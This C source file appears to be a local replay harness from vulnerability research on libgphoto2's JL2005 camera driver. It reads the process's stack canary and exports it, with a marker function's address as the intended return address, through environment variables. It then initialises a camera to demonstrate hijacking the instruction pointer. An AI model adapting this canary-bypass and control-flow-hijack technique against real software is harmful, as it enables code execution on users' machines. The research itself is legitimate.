/* W167 replay driver, local-only. Build against the plain installdir:
 * gcc -O0 -g -fno-omit-frame-pointer -I$P/include \
 *     -o two_stage_probe replay-two_stage_probe.c \
 *     -L$P/lib -lgphoto2 -lgphoto2_port -Wl,-rpath,$P/lib
 * Run with the env in evidence/real-plain-ip-control.out.
 * No network, no real USB device. */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <gphoto2/gphoto2.h>
#include <gphoto2/gphoto2-port-info-list.h>

static unsigned long own_canary(void)
{
	unsigned long v;
	__asm__ volatile("mov %%fs:0x28, %0" : "=r"(v));
	return v;
}

static void marker(void) __attribute__((noinline));
static void marker(void)
{
	const char msg[] = "M2SHELL_IP_CONTROL_MARKER\n";
	(void)!write(1, msg, sizeof(msg) - 1);
	_exit(0);
}

static void set_hex(const char *name, unsigned long v)
{
	char buf[32];
	snprintf(buf, sizeof(buf), "0x%016lx", v);
	setenv(name, buf, 1);
}

int main(int argc, char **argv)
{
	Camera *cam = NULL;
	CameraAbilitiesList *al = NULL;
	CameraAbilities ab;
	GPPortInfoList *il = NULL;
	GPPortInfo pi;
	const char *path = argc > 1 ? argv[1] : "usb:001,001";
	unsigned long canary = own_canary();
	int m, idx, rc;

	if (getenv("M2SHELL_JL2005_CANARY") == NULL)
		set_hex("M2SHELL_JL2005_CANARY", canary);
	if (getenv("M2SHELL_JL2005_RIP") == NULL)
		set_hex("M2SHELL_JL2005_RIP", (unsigned long)&marker);
	fprintf(stderr, "canary=0x%016lx marker=0x%016lx\n",
		canary, (unsigned long)&marker);

	if (gp_camera_new(&cam) < GP_OK) return 2;
	if (gp_abilities_list_new(&al) < GP_OK) return 2;
	if (gp_abilities_list_load(al, NULL) < GP_OK) return 2;
	m = gp_abilities_list_lookup_model(al, " JL2005B/C/D camera");
	if (m < 0) return 2;
	if (gp_abilities_list_get_abilities(al, m, &ab) < GP_OK) return 2;
	if (gp_camera_set_abilities(cam, ab) < GP_OK) return 2;
	if (gp_port_info_list_new(&il) < GP_OK) return 2;
	if (gp_port_info_list_load(il) < GP_OK) return 2;
	idx = gp_port_info_list_lookup_path(il, path);
	if (idx < 0) return 2;
	if (gp_port_info_list_get_info(il, idx, &pi) < GP_OK) return 2;
	if (gp_camera_set_port_info(cam, pi) < GP_OK) return 2;

	rc = gp_camera_init(cam, NULL);
	printf("gp_camera_init rc=%d\n", rc);
	return 0;
}
